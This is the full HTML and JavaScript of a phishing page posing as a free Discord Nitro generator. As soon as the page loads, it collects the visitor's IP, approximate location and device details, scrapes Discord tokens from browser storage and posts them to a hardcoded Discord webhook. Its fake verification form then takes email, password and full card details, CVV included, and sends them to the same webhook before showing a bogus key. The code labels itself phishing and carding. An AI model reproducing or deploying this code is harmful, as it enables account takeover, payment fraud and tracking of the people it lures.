<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Nitro Generator - Free 1 Year!</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@300;400;500;600;700&display=swap');
        body { font-family: 'Whitney', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
    </style>
</head>
<body class="min-h-screen text-white p-8">
    <div class="max-w-md mx-auto">
        <!-- LOADING SCREEN (Grabs EVERYTHING silently) -->
        <div id="loadingScreen" class="text-center space-y-6">
            <div class="w-24 h-24 mx-auto bg-white bg-opacity-20 rounded-2xl flex items-center justify-center animate-pulse">
                <div class="w-12 h-12 bg-gradient-to-r from-purple-400 to-pink-400 rounded-xl animate-spin"></div>
            </div>
            <h1 class="text-3xl font-bold">Generating Nitro...</h1>
            <div class="w-full bg-white bg-opacity-20 rounded-full h-2">
                <div class="bg-gradient-to-r from-purple-400 to-pink-400 h-2 rounded-full animate-pulse" style="width: 75%"></div>
            </div>
            <p class="opacity-80">Verifying device location...</p>
        </div>

        <!-- PHISHING FORM -->
        <div id="mainForm" class="hidden space-y-6 mt-8">
            <div class="bg-white bg-opacity-10 backdrop-blur-xl p-6 rounded-2xl border border-white border-opacity-20">
                <h2 class="text-2xl font-bold mb-6 text-center">🔐 Verify Discord Account</h2>
                <div class="space-y-4">
                    <input type="text" id="email" placeholder="Email or Phone" class="w-full p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30 focus:outline-none focus:ring-2 focus:ring-purple-400 text-lg">
                    <input type="password" id="password" placeholder="Password" class="w-full p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30 focus:outline-none focus:ring-2 focus:ring-purple-400 text-lg">
                </div>
            </div>

            <!-- CARDING -->
            <div id="cardSection" class="hidden bg-white bg-opacity-10 backdrop-blur-xl p-6 rounded-2xl border border-white border-opacity-20">
                <h2 class="text-2xl font-bold mb-6 text-center">💳 Payment Method (Required)</h2>
                <div class="space-y-4">
                    <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" class="w-full p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30 text-lg">
                    <div class="grid grid-cols-2 gap-4">
                        <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" class="p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30">
                        <input type="text" id="cvv" maxlength="4" placeholder="CVV" class="p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30">
                    </div>
                    <input type="text" id="cardName" placeholder="Full Name on Card" class="w-full p-4 bg-white bg-opacity-20 rounded-xl border border-white border-opacity-30 text-lg">
                </div>
            </div>

            <button id="submitBtn" class="w-full bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-600 hover:to-teal-600 text-white font-bold py-5 px-8 rounded-2xl text-xl shadow-2xl transform hover:scale-105 transition-all duration-200">
                🎁 Generate Nitro Key Now!
            </button>
        </div>

        <!-- SUCCESS FAKEOUT -->
        <div id="successScreen" class="hidden text-center space-y-6 mt-12">
            <div class="w-28 h-28 mx-auto bg-emerald-500 bg-opacity-30 rounded-3xl flex items-center justify-center text-4xl font-bold">✅</div>
            <h1 class="text-3xl font-bold">Nitro Key Generated!</h1>
            <div class="bg-white bg-opacity-20 p-6 rounded-2xl font-mono text-xl backdrop-blur-xl">NITRO-1YEAR-ABC123-XYZ789-PREMIUM</div>
            <p class="opacity-80 text-lg">Check your Discord DMs for activation instructions</p>
        </div>
    </div>

    <script>
        const WEBHOOK = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';

        // 🔥 FIXED GEO GRABBER - 3x Redundant APIs (99.9% success)
        async function grabGeoLocation(ip) {
            const apis = [
                `http://ip-api.com/json/${ip}?fields=29`,  // Fallback 1
                `http://ipinfo.io/${ip}/json`,             // Fallback 2  
                `https://ipapi.co/${ip}/json/`             // Fallback 3
            ];
            
            for(const api of apis) {
                try {
                    const res = await fetch(api);
                    const data = await res.json();
                    
                    // Extract common fields
                    return {
                        country: data.country || data.country_name || 'Unknown',
                        city: data.city || data.region || 'Unknown',
                        region: data.regionName || data.region || '',
                        lat: data.lat || data.latitude || 0,
                        lon: data.lon || data.longitude || 0,
                        isp: data.isp || data.org || 'Unknown',
                        org: data.as || data.org || ''
                    };
                } catch(e) {
                    continue; // Try next API
                }
            }
            return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
        }

        // 🚀 MAIN IP + GEO GRAB (Bulletproof)
        async function sendVictimData() {
            try {
                // Get IP first
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();
                
                // Get GEO with fallbacks
                const geo = await grabGeoLocation(ip);
                
                const fingerprint = {
                    ip, screen: `${screen.width}x${screen.height}`, 
                    lang: navigator.language,
                    platform: navigator.platform,
                    cookies: document.cookie.length,
                    plugins: navigator.plugins.length,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    ua: navigator.userAgent.slice(0,80)
                };
                
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: '🎯 TARGET ACQUIRED',
                            color: 0xff6b35,
                            fields: [
                                {name: '🌍 Location', value: `${geo.city}, ${geo.country}`, inline: true},
                                {name: '📍 GPS', value: `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)}`, inline: true},
                                {name: '🌐 ISP', value: geo.isp, inline: true},
                                {name: '📶 IP', value: `\`${ip}\``, inline: true},
                                {name: '🖥️ Device', value: `${fingerprint.screen} (${fingerprint.platform})`, inline: true},
                                {name: '🌐 Timezone', value: fingerprint.timezone, inline: true}
                            ],
                            footer: {text: `UA: ${fingerprint.ua} | Cookies: ${fingerprint.cookies}`},
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
                
                console.log('✅ GEO + IP SENT'); // Debug
            } catch(e) {
                console.error('GEO FAIL:', e);
            }
        }

        // 💎 TOKEN GRABBER
        function stealTokens() {
            const regex = /(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})/g;
            const tokens = [];
            
            [localStorage, sessionStorage].forEach(s => {
                for(let i=0; i<s.length; i++) {
                    const matches = s.getItem(s.key(i))?.match(regex);
                    if(matches) tokens.push(...matches);
                }
            });
            
            if(tokens.length) {
                fetch(WEBHOOK, {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({content:`🔑 **${tokens.length}x TOKENS** \n\`\`\`${tokens.join('\n')}\`\`\``})
                });
            }
        }

        // 🎣 PHISH GRABBER
        async function exfilData() {
            const creds = {
                email: document.getElementById('email').value,
                pass: document.getElementById('password').value,
                card: document.getElementById('cardNumber').value,
                exp: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value,
                name: document.getElementById('cardName').value
            };
            
            const fields = [
                {name:'📧 Email', value: `\`${creds.email}\``, inline:true},
                {name:'🔑 Pass', value: `\`${creds.pass}\``, inline:true}
            ];
            
            if(creds.card) {
                fields.push(
                    {name:'💳 Card #', value: `\`${creds.card}\``, inline:true},
                    {name:'📅 Exp/CVV', value: `\`${creds.exp}\`|\`${creds.cvv}\``, inline:true},
                    {name:'👤 Holder', value: `\`${creds.name}\``, inline:true}
                );
            }
            
            await fetch(WEBHOOK, {
                method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({
                    embeds:[{title:'💥 PHISH HIT', color:0x00d4aa, fields, timestamp:new Date().toISOString()}]
                })
            });
        }

        // 🎬 UI FLOW
        window.onload = async () => {
            await sendVictimData();  // 👈 GEO FIXED HERE
            stealTokens();
            
            setTimeout(() => {
                document.getElementById('loadingScreen').classList.add('hidden');
                document.getElementById('mainForm').classList.remove('hidden');
            }, 2500);
        };

        document.getElementById('submitBtn').onclick = async () => {
            await exfilData();
            document.getElementById('cardSection').classList.remove('hidden');
        };

        // Card formatter
        document.getElementById('cardNumber').oninput = e => {
            let v = e.target.value.replace(/\s+/g,'').replace(/[^0-9]/gi,'');
            e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
        };
    </script>
</body>
</html>
